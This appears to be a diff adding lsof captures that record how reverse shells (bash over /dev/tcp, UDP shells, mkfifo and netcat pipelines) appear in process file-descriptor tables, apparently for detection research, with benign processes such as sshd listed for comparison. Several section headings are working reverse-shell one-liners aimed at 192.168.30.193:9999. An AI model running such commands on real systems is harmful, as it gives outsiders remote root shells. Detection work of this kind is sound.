+sh      327 root    1u  IPv4 662972       0t0      TCP 192.168.180.32:54605->192.168.30.193:distinct (ESTABLISHED)
+sh      327 root    2u  IPv4 662972       0t0      TCP 192.168.180.32:54605->192.168.30.193:distinct (ESTABLISHED)
+sh      327 root    5u  sock    0,6       0t0   662269 protocol: TCP
+sh      327 root  196u  IPv4 662972       0t0      TCP 192.168.180.32:54605->192.168.30.193:distinct (ESTABLISHED)
+
+
+sh:
+COMMAND   PID USER   FD   TYPE  DEVICE SIZE/OFF    NODE NAME
+sh      30165 root  cwd    DIR   253,0     4096  669498 /usr/local/sdl_sniffer
+sh      30165 root  rtd    DIR   253,0     4096       2 /
+sh      30165 root  txt    REG   253,0   940416 1835055 /bin/bash
+sh      30165 root  mem    REG   253,0   156936  524701 /lib64/ld-2.12.so
+sh      30165 root  mem    REG   253,0    22536  524709 /lib64/libdl-2.12.so
+sh      30165 root  mem    REG   253,0  1926760  524702 /lib64/libc-2.12.so
+sh      30165 root  mem    REG   253,0   138280  524500 /lib64/libtinfo.so.5.7
+sh      30165 root  mem    REG   253,0    65928  524318 /lib64/libnss_files-2.12.so
+sh      30165 root  mem    REG   253,0 99158576  657416 /usr/lib/locale/locale-archive
+sh      30165 root  mem    REG   253,0    26060  657672 /usr/lib64/gconv/gconv-modules.cache
+sh      30165 root    0u  IPv4 2855874      0t0     TCP 192.168.180.182:40569->192.168.30.193:distinct (ESTABLISHED)
+sh      30165 root    1u  IPv4 2855874      0t0     TCP 192.168.180.182:40569->192.168.30.193:distinct (ESTABLISHED)
+sh      30165 root    2u  IPv4 2855874      0t0     TCP 192.168.180.182:40569->192.168.30.193:distinct (ESTABLISHED)
+sh      30165 root  255u   CHR     5,0      0t0    5384 /dev/tty
+
+bash:
+COMMAND   PID USER   FD   TYPE  DEVICE SIZE/OFF    NODE NAME
+bash    30211 root  cwd    DIR   253,0     4096  669498 /usr/local/sdl_sniffer
+bash    30211 root  rtd    DIR   253,0     4096       2 /
+bash    30211 root  txt    REG   253,0   940416 1835055 /bin/bash
+bash    30211 root  mem    REG   253,0   156936  524701 /lib64/ld-2.12.so
+bash    30211 root  mem    REG   253,0    22536  524709 /lib64/libdl-2.12.so
+bash    30211 root  mem    REG   253,0  1926760  524702 /lib64/libc-2.12.so
+bash    30211 root  mem    REG   253,0   138280  524500 /lib64/libtinfo.so.5.7
+bash    30211 root  mem    REG   253,0    65928  524318 /lib64/libnss_files-2.12.so
+bash    30211 root  mem    REG   253,0 99158576  657416 /usr/lib/locale/locale-archive
+bash    30211 root  mem    REG   253,0    26060  657672 /usr/lib64/gconv/gconv-modules.cache
+bash    30211 root    0u  IPv4 2856218      0t0     TCP 192.168.180.182:40570->192.168.30.193:distinct (ESTABLISHED)
+bash    30211 root    1u  IPv4 2856218      0t0     TCP 192.168.180.182:40570->192.168.30.193:distinct (ESTABLISHED)
+bash    30211 root    2u  IPv4 2856218      0t0     TCP 192.168.180.182:40570->192.168.30.193:distinct (ESTABLISHED)
+bash    30211 root  255u   CHR     5,0      0t0    5384 /dev/tty
+
+udp bash1:
+COMMAND   PID USER   FD   TYPE   DEVICE  SIZE/OFF      NODE NAME
+bash    19714 root  cwd    DIR    253,0      4096  71670242 /root/test-shell
+bash    19714 root  rtd    DIR    253,0      4096       128 /
+bash    19714 root  txt    REG    253,0    964544  67109012 /usr/bin/bash
+bash    19714 root  mem    REG    253,0     62184 134380733 /usr/lib64/libnss_files-2.17.so
+bash    19714 root  mem    REG    253,0 106070960 138151503 /usr/lib/locale/locale-archive
+bash    19714 root  mem    REG    253,0   2173512 134380704 /usr/lib64/libc-2.17.so
+bash    19714 root  mem    REG    253,0     19776 134380712 /usr/lib64/libdl-2.17.so
+bash    19714 root  mem    REG    253,0    174576 134402580 /usr/lib64/libtinfo.so.5.9
+bash    19714 root  mem    REG    253,0    164240 134297047 /usr/lib64/ld-2.17.so
+bash    19714 root  mem    REG    253,0     26254 201450820 /usr/lib64/gconv/gconv-modules.cache
+bash    19714 root    0u  IPv4 15870544       0t0       UDP localhost.localdomain:43316->192.168.30.193:distinct 
+bash    19714 root    1u  IPv4 15870544       0t0       UDP localhost.localdomain:43316->192.168.30.193:distinct 
+bash    19714 root    2u  IPv4 15870544       0t0       UDP localhost.localdomain:43316->192.168.30.193:distinct 
+bash    19714 root  255u   CHR      5,0       0t0      1036 /dev/tty
+
+udp bash2:
+COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
+bash 19584 root cwd DIR 253,0 4096 71670242 /root/test-shell
+bash 19584 root rtd DIR 253,0 4096 128 /
+bash 19584 root txt REG 253,0 964544 67109012 /usr/bin/bash
+bash 19584 root mem REG 253,0 106070960 138151503 /usr/lib/locale/locale-archive
+bash 19584 root mem REG 253,0 2173512 134380704 /usr/lib64/libc-2.17.so
+bash 19584 root mem REG 253,0 19776 134380712 /usr/lib64/libdl-2.17.so
+bash 19584 root mem REG 253,0 174576 134402580 /usr/lib64/libtinfo.so.5.9
+bash 19584 root mem REG 253,0 164240 134297047 /usr/lib64/ld-2.17.so
+bash 19584 root mem REG 253,0 26254 201450820 /usr/lib64/gconv/gconv-modules.cache
+bash 19584 root 0u CHR 136,1 0t0 4 /dev/pts/1
+bash 19584 root 1u IPv4 15869509 0t0 UDP localhost.localdomain:35362->192.168.30.193:distinct
+bash 19584 root 2u IPv4 15869509 0t0 UDP localhost.localdomain:35362->192.168.30.193:distinct
+bash 19584 root 3u IPv4 15869509 0t0 UDP localhost.localdomain:35362->192.168.30.193:distinct
+bash 19584 root 255r REG 253,0 142 71670248 /root/test-shell/shell_udp.sh
+
+mkfifo:
+COMMAND  PID PPID USER   FD   TYPE DEVICE  SIZE/OFF      NODE NAME
+bash    8285 8978 root  cwd    DIR  253,0      4096 108984392 /root/Oracle/Middleware/user_projects/domains/base_domain
+bash    8285 8978 root  rtd    DIR  253,0      4096       128 /
+bash    8285 8978 root  txt    REG  253,0    964544  34084471 /usr/bin/bash
+bash    8285 8978 root  mem    REG  253,0 106070960  34084466 /usr/lib/locale/locale-archive
+bash    8285 8978 root  mem    REG  253,0   2173512  67224378 /usr/lib64/libc-2.17.so
+bash    8285 8978 root  mem    REG  253,0     19776  67224386 /usr/lib64/libdl-2.17.so
+bash    8285 8978 root  mem    REG  253,0    174576  67224751 /usr/lib64/libtinfo.so.5.9
+bash    8285 8978 root  mem    REG  253,0    164240  67224370 /usr/lib64/ld-2.17.so
+bash    8285 8978 root  mem    REG  253,0     26254  67224718 /usr/lib64/gconv/gconv-modules.cache
+bash    8285 8978 root    0r  FIFO    0,9       0t0   6025577 pipe
+bash    8285 8978 root    1w  FIFO    0,9       0t0   6025578 pipe
+bash    8285 8978 root    2w  FIFO    0,9       0t0   6025578 pipe
+
+COMMAND  PID PPID USER   FD   TYPE DEVICE  SIZE/OFF      NODE NAME
+cat     8290 8285 root  cwd    DIR  253,0      4096 108984392 /root/Oracle/Middleware/user_projects/domains/base_domain
+cat     8290 8285 root  rtd    DIR  253,0      4096       128 /
+cat     8290 8285 root  txt    REG  253,0     54080  33779045 /usr/bin/cat
+cat     8290 8285 root  mem    REG  253,0 106070960  34084466 /usr/lib/locale/locale-archive
+cat     8290 8285 root  mem    REG  253,0   2173512  67224378 /usr/lib64/libc-2.17.so
+cat     8290 8285 root  mem    REG  253,0    164240  67224370 /usr/lib64/ld-2.17.so
+cat     8290 8285 root    0r  FIFO    0,9       0t0   6025577 pipe
+cat     8290 8285 root    1w  FIFO    0,9       0t0   6026089 pipe
+cat     8290 8285 root    2w  FIFO    0,9       0t0   6025578 pipe
+cat     8290 8285 root    3r  FIFO  253,0       0t0 109228602 /tmp/f
+
+COMMAND  PID PPID USER   FD   TYPE DEVICE  SIZE/OFF      NODE NAME
+bash    8291 8285 root  cwd    DIR  253,0      4096 108984392 /root/Oracle/Middleware/user_projects/domains/base_domain
+bash    8291 8285 root  rtd    DIR  253,0      4096       128 /
+bash    8291 8285 root  txt    REG  253,0    964544  34084471 /usr/bin/bash
+bash    8291 8285 root  mem    REG  253,0     62184  69162351 /usr/lib64/libnss_files-2.17.so
+bash    8291 8285 root  mem    REG  253,0 106070960  34084466 /usr/lib/locale/locale-archive
+bash    8291 8285 root  mem    REG  253,0   2173512  67224378 /usr/lib64/libc-2.17.so
+bash    8291 8285 root  mem    REG  253,0     19776  67224386 /usr/lib64/libdl-2.17.so
+bash    8291 8285 root  mem    REG  253,0    174576  67224751 /usr/lib64/libtinfo.so.5.9
+bash    8291 8285 root  mem    REG  253,0    164240  67224370 /usr/lib64/ld-2.17.so
+bash    8291 8285 root  mem    REG  253,0     26254  67224718 /usr/lib64/gconv/gconv-modules.cache
+bash    8291 8285 root    0r  FIFO    0,9       0t0   6026089 pipe
+bash    8291 8285 root    1w  FIFO    0,9       0t0   6026090 pipe
+bash    8291 8285 root    2w  FIFO    0,9       0t0   6026090 pipe
+bash    8291 8285 root    3r  FIFO    0,9       0t0   6026210 pipe
+bash    8291 8285 root  255u   CHR    5,0       0t0      5086 /dev/tty
+
+COMMAND  PID PPID USER   FD   TYPE  DEVICE SIZE/OFF      NODE NAME
+nc      8292 8285 root  cwd    DIR   253,0     4096 108984392 /root/Oracle/Middleware/user_projects/domains/base_domain
+nc      8292 8285 root  rtd    DIR   253,0     4096       128 /
+nc      8292 8285 root  txt    REG   253,0   380208  34605174 /usr/bin/ncat
+nc      8292 8285 root  mem    REG   253,0   402384  67224754 /usr/lib64/libpcre.so.1.2.0
+nc      8292 8285 root  mem    REG   253,0   155784  67263196 /usr/lib64/libselinux.so.1
+nc      8292 8285 root  mem    REG   253,0   144792  69162358 /usr/lib64/libpthread-2.17.so
+nc      8292 8285 root  mem    REG   253,0   106848  68349448 /usr/lib64/libresolv-2.17.so
+nc      8292 8285 root  mem    REG   253,0    15688  67462077 /usr/lib64/libkeyutils.so.1.5
+nc      8292 8285 root  mem    REG   253,0    58728  68218514 /usr/lib64/libkrb5support.so.0.1
+nc      8292 8285 root  mem    REG   253,0    90664  67263199 /usr/lib64/libz.so.1.2.7
+nc      8292 8285 root  mem    REG   253,0   210840  67502446 /usr/lib64/libk5crypto.so.3.1
+nc      8292 8285 root  mem    REG   253,0    15920  67311360 /usr/lib64/libcom_err.so.2.1
+nc      8292 8285 root  mem    REG   253,0   963576  67502456 /usr/lib64/libkrb5.so.3.3
+nc      8292 8285 root  mem    REG   253,0   320408  67502442 /usr/lib64/libgssapi_krb5.so.2.2
+nc      8292 8285 root  mem    REG   253,0  2173512  67224378 /usr/lib64/libc-2.17.so
+nc      8292 8285 root  mem    REG   253,0    19776  67224386 /usr/lib64/libdl-2.17.so
+nc      8292 8285 root  mem    REG   253,0  1139680  69162347 /usr/lib64/libm-2.17.so
+nc      8292 8285 root  mem    REG   253,0   266496  67790531 /usr/lib64/libpcap.so.1.5.3
+nc      8292 8285 root  mem    REG   253,0  2512832  68349464 /usr/lib64/libcrypto.so.1.0.2k
+nc      8292 8285 root  mem    REG   253,0   470360  67502470 /usr/lib64/libssl.so.1.0.2k
+nc      8292 8285 root  mem    REG   253,0   164240  67224370 /usr/lib64/ld-2.17.so
+nc      8292 8285 root    0r  FIFO     0,9      0t0   6026090 pipe
+nc      8292 8285 root    1w  FIFO   253,0      0t0 109228602 /tmp/f
+nc      8292 8285 root    2w  FIFO     0,9      0t0   6025578 pipe
+nc      8292 8285 root    3u  IPv4 6026140      0t0       TCP 192.168.180.32:39564->192.168.30.193:9999 (ESTABLISHED)
+
+nc 192.168.30.193 9999|/bin/bash -i 2>&1:
+COMMAND   PID  PPID USER   FD   TYPE DEVICE  SIZE/OFF      NODE NAME
+bash    15109 12909 root  cwd    DIR  253,0      4096 108984392 /root/Oracle/Middleware/user_projects/domains/base_domain
+bash    15109 12909 root  rtd    DIR  253,0      4096       128 /
+bash    15109 12909 root  txt    REG  253,0    964544  34084471 /usr/bin/bash
+bash    15109 12909 root  mem    REG  253,0 106070960  34084466 /usr/lib/locale/locale-archive
+bash    15109 12909 root  mem    REG  253,0   2173512  67224378 /usr/lib64/libc-2.17.so
+bash    15109 12909 root  mem    REG  253,0     19776  67224386 /usr/lib64/libdl-2.17.so
+bash    15109 12909 root  mem    REG  253,0    174576  67224751 /usr/lib64/libtinfo.so.5.9
+bash    15109 12909 root  mem    REG  253,0    164240  67224370 /usr/lib64/ld-2.17.so
+bash    15109 12909 root  mem    REG  253,0     26254  67224718 /usr/lib64/gconv/gconv-modules.cache
+bash    15109 12909 root    0r  FIFO    0,9       0t0   6074891 pipe
+bash    15109 12909 root    1w  FIFO    0,9       0t0   6074892 pipe
+bash    15109 12909 root    2w  FIFO    0,9       0t0   6074892 pipe
+
+COMMAND   PID  PPID USER   FD   TYPE  DEVICE SIZE/OFF      NODE NAME
+nc      15110 15109 root  cwd    DIR   253,0     4096 108984392 /root/Oracle/Middleware/user_projects/domains/base_domain
+nc      15110 15109 root  rtd    DIR   253,0     4096       128 /
+nc      15110 15109 root  txt    REG   253,0   380208  34605174 /usr/bin/ncat
+nc      15110 15109 root  mem    REG   253,0   402384  67224754 /usr/lib64/libpcre.so.1.2.0
+nc      15110 15109 root  mem    REG   253,0   155784  67263196 /usr/lib64/libselinux.so.1
+nc      15110 15109 root  mem    REG   253,0   144792  69162358 /usr/lib64/libpthread-2.17.so
+nc      15110 15109 root  mem    REG   253,0   106848  68349448 /usr/lib64/libresolv-2.17.so
+nc      15110 15109 root  mem    REG   253,0    15688  67462077 /usr/lib64/libkeyutils.so.1.5
+nc      15110 15109 root  mem    REG   253,0    58728  68218514 /usr/lib64/libkrb5support.so.0.1
+nc      15110 15109 root  mem    REG   253,0    90664  67263199 /usr/lib64/libz.so.1.2.7
+nc      15110 15109 root  mem    REG   253,0   210840  67502446 /usr/lib64/libk5crypto.so.3.1
+nc      15110 15109 root  mem    REG   253,0    15920  67311360 /usr/lib64/libcom_err.so.2.1
+nc      15110 15109 root  mem    REG   253,0   963576  67502456 /usr/lib64/libkrb5.so.3.3
+nc      15110 15109 root  mem    REG   253,0   320408  67502442 /usr/lib64/libgssapi_krb5.so.2.2
+nc      15110 15109 root  mem    REG   253,0  2173512  67224378 /usr/lib64/libc-2.17.so
+nc      15110 15109 root  mem    REG   253,0    19776  67224386 /usr/lib64/libdl-2.17.so
+nc      15110 15109 root  mem    REG   253,0  1139680  69162347 /usr/lib64/libm-2.17.so
+nc      15110 15109 root  mem    REG   253,0   266496  67790531 /usr/lib64/libpcap.so.1.5.3
+nc      15110 15109 root  mem    REG   253,0  2512832  68349464 /usr/lib64/libcrypto.so.1.0.2k
+nc      15110 15109 root  mem    REG   253,0   470360  67502470 /usr/lib64/libssl.so.1.0.2k
+nc      15110 15109 root  mem    REG   253,0   164240  67224370 /usr/lib64/ld-2.17.so
+nc      15110 15109 root    0r  FIFO     0,9      0t0   6074891 pipe
+nc      15110 15109 root    1w  FIFO     0,9      0t0   6075343 pipe
+nc      15110 15109 root    2w  FIFO     0,9      0t0   6074892 pipe
+nc      15110 15109 root    3u  IPv4 6075406      0t0       TCP 192.168.180.32:39570->192.168.30.193:9999 (ESTABLISHED)
+
+COMMAND   PID  PPID USER   FD   TYPE DEVICE  SIZE/OFF      NODE NAME
+bash    15111 15109 root  cwd    DIR  253,0      4096 108984392 /root/Oracle/Middleware/user_projects/domains/base_domain
+bash    15111 15109 root  rtd    DIR  253,0      4096       128 /
+bash    15111 15109 root  txt    REG  253,0    964544  34084471 /usr/bin/bash
+bash    15111 15109 root  mem    REG  253,0     62184  69162351 /usr/lib64/libnss_files-2.17.so
+bash    15111 15109 root  mem    REG  253,0 106070960  34084466 /usr/lib/locale/locale-archive
+bash    15111 15109 root  mem    REG  253,0   2173512  67224378 /usr/lib64/libc-2.17.so
+bash    15111 15109 root  mem    REG  253,0     19776  67224386 /usr/lib64/libdl-2.17.so
+bash    15111 15109 root  mem    REG  253,0    174576  67224751 /usr/lib64/libtinfo.so.5.9
+bash    15111 15109 root  mem    REG  253,0    164240  67224370 /usr/lib64/ld-2.17.so
+bash    15111 15109 root  mem    REG  253,0     26254  67224718 /usr/lib64/gconv/gconv-modules.cache
+bash    15111 15109 root    0r  FIFO    0,9       0t0   6075343 pipe
+bash    15111 15109 root    1w  FIFO    0,9       0t0   6074892 pipe
+bash    15111 15109 root    2w  FIFO    0,9       0t0   6074892 pipe
+bash    15111 15109 root    3r  FIFO    0,9       0t0   6075521 pipe
+bash    15111 15109 root  255u   CHR    5,0       0t0      5086 /dev/tty
+
+
+可能影响的：
+tcp_sniff：
+COMMAND     PID USER   FD   TYPE  DEVICE SIZE/OFF    NODE NAME
+tcp_sniff 17704 root  cwd    DIR   253,0     4096  669498 /usr/local/sdl_sniffer
+tcp_sniff 17704 root  rtd    DIR   253,0     4096       2 /
+tcp_sniff 17704 root  txt    REG   253,0  2735447  669500 /usr/local/sdl_sniffer/tcp_sniffer
+tcp_sniff 17704 root    0u   CHR   136,2      0t0       5 /dev/pts/2
+tcp_sniff 17704 root    1u   CHR   136,2      0t0       5 /dev/pts/2
+tcp_sniff 17704 root    2u   CHR   136,2      0t0       5 /dev/pts/2
+tcp_sniff 17704 root    3w   REG   253,0    14915 1179937 /var/log/2018_11_21_mylog.log
+tcp_sniff 17704 root    4u  IPv4 2759339      0t0     TCP 192.168.180.182:entextnetwk->192.168.120.62:9003 (ESTABLISHED)
+tcp_sniff 17704 root    5u   raw              0t0 2759340 00000000:0006->00000000:0000 st=07
+
+bash -i>/dev/tcp/192.168.30.193/9999
+COMMAND   PID USER   FD   TYPE DEVICE  SIZE/OFF     NODE NAME
+bash    21862 root  cwd    DIR  253,0      4096 67165249 /root
+bash    21862 root  rtd    DIR  253,0      4096      128 /
+bash    21862 root  txt    REG  253,0    964544 34084471 /usr/bin/bash
+bash    21862 root  mem    REG  253,0     62184 69162351 /usr/lib64/libnss_files-2.17.so
+bash    21862 root  mem    REG  253,0 106070960 34084466 /usr/lib/locale/locale-archive
+bash    21862 root  mem    REG  253,0   2173512 67224378 /usr/lib64/libc-2.17.so
+bash    21862 root  mem    REG  253,0     19776 67224386 /usr/lib64/libdl-2.17.so
+bash    21862 root  mem    REG  253,0    174576 67224751 /usr/lib64/libtinfo.so.5.9
+bash    21862 root  mem    REG  253,0    164240 67224370 /usr/lib64/ld-2.17.so
+bash    21862 root  mem    REG  253,0     26254 67224718 /usr/lib64/gconv/gconv-modules.cache
+bash    21862 root    0u   CHR  136,2       0t0        5 /dev/pts/2
+bash    21862 root    1u  IPv4 580868       0t0      TCP 192.168.180.32:54479->192.168.30.193:distinct (ESTABLISHED)
+bash    21862 root    2u   CHR  136,2       0t0        5 /dev/pts/2
+bash    21862 root  255u   CHR  136,2       0t0        5 /dev/pts/2
+
+bash -i >&/dev/tcp/192.168.30.193/9999
+COMMAND  PID USER   FD   TYPE   DEVICE  SIZE/OFF      NODE NAME
+bash    6913 root  cwd    DIR    253,0      4096 134294593 /root
+bash    6913 root  rtd    DIR    253,0      4096       128 /
+bash    6913 root  txt    REG    253,0    964544  67109012 /usr/bin/bash
+bash    6913 root  mem    REG    253,0     62184 134380733 /usr/lib64/libnss_files-2.17.so
+bash    6913 root  mem    REG    253,0 106070960 138151503 /usr/lib/locale/locale-archive
+bash    6913 root  mem    REG    253,0   2173512 134380704 /usr/lib64/libc-2.17.so
+bash    6913 root  mem    REG    253,0     19776 134380712 /usr/lib64/libdl-2.17.so
+bash    6913 root  mem    REG    253,0    174576 134402580 /usr/lib64/libtinfo.so.5.9
+bash    6913 root  mem    REG    253,0    164240 134297047 /usr/lib64/ld-2.17.so
+bash    6913 root  mem    REG    253,0     26254 201450820 /usr/lib64/gconv/gconv-modules.cache
+bash    6913 root    0u   CHR    136,1       0t0         4 /dev/pts/1
+bash    6913 root    1u  IPv4 16475945       0t0       TCP localhost.localdomain:48650->192.168.30.193:distinct (ESTABLISHED)
+bash    6913 root    2u  IPv4 16475945       0t0       TCP localhost.localdomain:48650->192.168.30.193:distinct (ESTABLISHED)
+bash    6913 root  255u   CHR      5,0       0t0      1036 /dev/tty
+
+
+dc_client：
+COMMAND   PID USER   FD      TYPE             DEVICE  SIZE/OFF      NODE NAME
+dc_client 916 root  cwd       DIR              253,0      4096  67567360 /usr/local/moresec_drip/dc_client/dc_client_201811192230/bin
+dc_client 916 root  rtd       DIR              253,0      4096       128 /
+dc_client 916 root  txt       REG              253,0  41439592  67567366 /usr/local/moresec_drip/dc_client/dc_client_201811192230/bin/dc_client
+dc_client 916 root  mem       REG              253,0     37240  67210257 /usr/lib64/libnss_sss.so.2
+dc_client 916 root  mem       REG              253,0     62184  69162351 /usr/lib64/libnss_files-2.17.so
+dc_client 916 root  mem       REG              253,0   2173512  67224378 /usr/lib64/libc-2.17.so
+dc_client 916 root  mem       REG              253,0   1139680  69162347 /usr/lib64/libm-2.17.so
+dc_client 916 root  mem       REG              253,0     88776  69162328 /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+dc_client 916 root  mem       REG              253,0     19776  67224386 /usr/lib64/libdl-2.17.so
+dc_client 916 root  mem       REG              253,0     44448  69162360 /usr/lib64/librt-2.17.so
+dc_client 916 root  mem       REG              253,0    144792  69162358 /usr/lib64/libpthread-2.17.so
+dc_client 916 root  mem       REG              253,0    164240  67224370 /usr/lib64/ld-2.17.so
+dc_client 916 root    0u      CHR              136,0       0t0         3 /dev/pts/0 (deleted)
+dc_client 916 root    1u      REG              253,0 125041990   2224965 /usr/local/moresec_drip/dc_client/dc_client_201811192230/log/log_0.log
+dc_client 916 root    2u      REG              253,0 125041990   2224965 /usr/local/moresec_drip/dc_client/dc_client_201811192230/log/log_0.log
+dc_client 916 root    3u      REG              253,0   2406498 101645594 /usr/local/moresec_drip/dc_update/dc_update_201811191113/log/log_0.log (deleted)
+dc_client 916 root    4u      REG              253,0  21406674   2224962 /usr/local/moresec_drip/dc_update/dc_update_201811192229/log/log_0.log
+dc_client 916 root    5u      REG              253,0         6  70050739 /usr/local/moresec_drip/dc_update.pid
+dc_client 916 root    6u      REG              253,0 125041990   2224965 /usr/local/moresec_drip/dc_client/dc_client_201811192230/log/log_0.log
+dc_client 916 root    7uW     REG              253,0         4  69996515 /usr/local/moresec_drip/dc_client.pid
+dc_client 916 root    8u     IPv4             451090       0t0       UDP *:48595 
+dc_client 916 root    9u  a_inode                0,9         0      4670 [eventpoll]
+dc_client 916 root   10u     IPv4             464802       0t0       UDP *:38313 
+dc_client 916 root   11u     unix 0xffff88003c87c3c0       0t0    525859 socket
+dc_client 916 root   12u     unix 0xffff88003c87c000       0t0    525860 socket
+dc_client 916 root   13u      REG              253,0      3072  45517842 /usr/local/moresec_drip/dc_conf/conf.db
+dc_client 916 root   14u      REG              253,0    581632  45517843 /usr/local/moresec_drip/dc_conf/prof.db
+dc_client 916 root   15ur     REG              253,0      7168  45517844 /usr/local/moresec_drip/dc_conf/data.db
+dc_client 916 root   16u     IPv4             528166       0t0       TCP 192.168.180.32:58328->192.168.110.50:8012 (ESTABLISHED)
+dc_client 916 root   17u     unix 0xffff88003d75d2c0       0t0    525865 /usr/local/moresec_drip/dc_unix_sock
+dc_client 916 root   18u     IPv4             525866       0t0       UDP *:59845 
+dc_client 916 root   19u  a_inode                0,9         0      4670 [eventpoll]
+dc_client 916 root   20u     unix 0xffff88003d4e2f00       0t0    525869 socket
+dc_client 916 root   21u     unix 0xffff88003b557a40       0t0    525870 socket
+dc_client 916 root   22r  a_inode                0,9         0      4670 inotify
+dc_client 916 root   23r     FIFO                0,8       0t0    525873 pipe
+dc_client 916 root   24w     FIFO                0,8       0t0    525873 pipe
+dc_client 916 root   25u  a_inode                0,9         0      4670 [eventpoll]
+dc_client 916 root   26r     FIFO                0,8       0t0    525874 pipe
+dc_client 916 root   27w     FIFO                0,8       0t0    525874 pipe
+dc_client 916 root   28u  a_inode                0,9         0      4670 [eventfd]
+dc_client 916 root   29u     sock                0,6       0t0    525921 protocol: NETLINK
+dc_client 916 root   30u     unix 0xffff88003b7b8b40       0t0    526121 /usr/local/moresec_drip/dc_unix_sock
+dc_client 916 root   31u      REG              253,0      1544  45449365 /usr/local/moresec_drip/dc_conf/data.db-journal
+
+sshd:
+COMMAND  PID USER   FD   TYPE             DEVICE SIZE/OFF     NODE NAME
+sshd    7802 root  cwd    DIR              253,0     4096      128 /
+sshd    7802 root  rtd    DIR              253,0     4096      128 /
+sshd    7802 root  txt    REG              253,0   853040 67888923 /usr/sbin/sshd
+sshd    7802 root  mem    REG              253,0    37240 67210257 /usr/lib64/libnss_sss.so.2
+sshd    7802 root  mem    REG              253,0    15480   134915 /usr/lib64/security/pam_lastlog.so
+sshd    7802 root  mem    REG              253,0    15632 67566706 /usr/lib64/libpam_misc.so.0.82.0
+sshd    7802 root  mem    REG              253,0   309272   214224 /usr/lib64/security/pam_systemd.so
+sshd    7802 root  mem    REG              253,0    19600   134916 /usr/lib64/security/pam_limits.so
+sshd    7802 root  mem    REG              253,0    11152   134913 /usr/lib64/security/pam_keyinit.so
+sshd    7802 root  mem    REG              253,0    40784   134923 /usr/lib64/security/pam_namespace.so
+sshd    7802 root  mem    REG              253,0    11200   134919 /usr/lib64/security/pam_loginuid.so
+sshd    7802 root  mem    REG              253,0    19760   138886 /usr/lib64/security/pam_selinux.so
+sshd    7802 root  mem    REG              253,0    44600 67566613 /usr/lib64/libcrack.so.2.9.0
+sshd    7802 root  mem    REG              253,0    23832 67506028 /usr/lib64/libpwquality.so.1.0.2
+sshd    7802 root  mem    REG              253,0    11232   126162 /usr/lib64/security/pam_pwquality.so
+sshd    7802 root  mem    REG              253,0     6984   134925 /usr/lib64/security/pam_permit.so
+sshd    7802 root  mem    REG              253,0    11144   134918 /usr/lib64/security/pam_localuser.so
+sshd    7802 root  mem    REG              253,0    11176   134924 /usr/lib64/security/pam_nologin.so
+sshd    7802 root  mem    REG              253,0     6872   126172 /usr/lib64/security/pam_deny.so
+sshd    7802 root  mem    REG              253,0    15408   152351 /usr/lib64/security/pam_succeed_if.so
+sshd    7802 root  mem    REG              253,0    57728   187594 /usr/lib64/security/pam_unix.so
+sshd    7802 root  mem    REG              253,0    15552   126174 /usr/lib64/security/pam_env.so
+sshd    7802 root  mem    REG              253,0    15496   138888 /usr/lib64/security/pam_sepermit.so
+sshd    7802 root  mem    REG              253,0    31824 67748815 /usr/lib64/libnss_dns-2.17.so
+sshd    7802 root  mem    REG              253,0    62184 69162351 /usr/lib64/libnss_files-2.17.so
+sshd    7802 root  mem    REG              253,0    68192 67311391 /usr/lib64/libbz2.so.1.0.6
+sshd    7802 root  mem    REG              253,0    99944 67311370 /usr/lib64/libelf-0.170.so
+sshd    7802 root  mem    REG              253,0    19896 67311446 /usr/lib64/libattr.so.1.1.0
+sshd    7802 root  mem    REG              253,0    15688 67462077 /usr/lib64/libkeyutils.so.1.5
+sshd    7802 root  mem    REG              253,0    58728 68218514 /usr/lib64/libkrb5support.so.0.1
+sshd    7802 root  mem    REG              253,0    11448 67210996 /usr/lib64/libfreebl3.so
+sshd    7802 root  mem    REG              253,0   251832 67224708 /usr/lib64/libnspr4.so
+sshd    7802 root  mem    REG              253,0    20096 67224719 /usr/lib64/libplc4.so
+sshd    7802 root  mem    REG              253,0    15800 67224720 /usr/lib64/libplds4.so
+sshd    7802 root  mem    REG              253,0   194944 67224721 /usr/lib64/libnssutil3.so
+sshd    7802 root  mem    REG              253,0  1249536 67715996 /usr/lib64/libnss3.so
+sshd    7802 root  mem    REG              253,0   164288 67715997 /usr/lib64/libsmime3.so
+sshd    7802 root  mem    REG              253,0   340976 67715998 /usr/lib64/libssl3.so
+sshd    7802 root  mem    REG              253,0   470360 67502470 /usr/lib64/libssl.so.1.0.2k
+sshd    7802 root  mem    REG              253,0   121320 67498195 /usr/lib64/libsasl2.so.3.0.0
+sshd    7802 root  mem    REG              253,0   144792 69162358 /usr/lib64/libpthread-2.17.so
+sshd    7802 root  mem    REG              253,0    88776 69162328 /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+sshd    7802 root  mem    REG              253,0   297360 67599527 /usr/lib64/libdw-0.170.so
+sshd    7802 root  mem    REG              253,0    19384 67326834 /usr/lib64/libgpg-error.so.0.10.0
+sshd    7802 root  mem    REG              253,0   535064 67326836 /usr/lib64/libgcrypt.so.11.8.2
+sshd    7802 root  mem    REG              253,0    85952 68218158 /usr/lib64/liblz4.so.1.7.5
+sshd    7802 root  mem    REG              253,0   157424 67311332 /usr/lib64/liblzma.so.5.2.2
+sshd    7802 root  mem    REG              253,0    44448 69162360 /usr/lib64/librt-2.17.so
+sshd    7802 root  mem    REG              253,0  1139680 69162347 /usr/lib64/libm-2.17.so
+sshd    7802 root  mem    REG              253,0    20032 67311448 /usr/lib64/libcap.so.2.22
+sshd    7802 root  mem    REG              253,0   402384 67224754 /usr/lib64/libpcre.so.1.2.0
+sshd    7802 root  mem    REG              253,0    23968 67326872 /usr/lib64/libcap-ng.so.0.0.0
+sshd    7802 root  mem    REG              253,0   117680 69162349 /usr/lib64/libnsl-2.17.so
+sshd    7802 root  mem    REG              253,0  2173512 67224378 /usr/lib64/libc-2.17.so
+sshd    7802 root  mem    REG              253,0    15920 67311360 /usr/lib64/libcom_err.so.2.1
+sshd    7802 root  mem    REG              253,0   210840 67502446 /usr/lib64/libk5crypto.so.3.1
+sshd    7802 root  mem    REG              253,0   963576 67502456 /usr/lib64/libkrb5.so.3.3
+sshd    7802 root  mem    REG              253,0   320408 67502442 /usr/lib64/libgssapi_krb5.so.2.2
+sshd    7802 root  mem    REG              253,0   106848 68349448 /usr/lib64/libresolv-2.17.so
+sshd    7802 root  mem    REG              253,0    41080 67224383 /usr/lib64/libcrypt-2.17.so
+sshd    7802 root  mem    REG              253,0    90664 67263199 /usr/lib64/libz.so.1.2.7
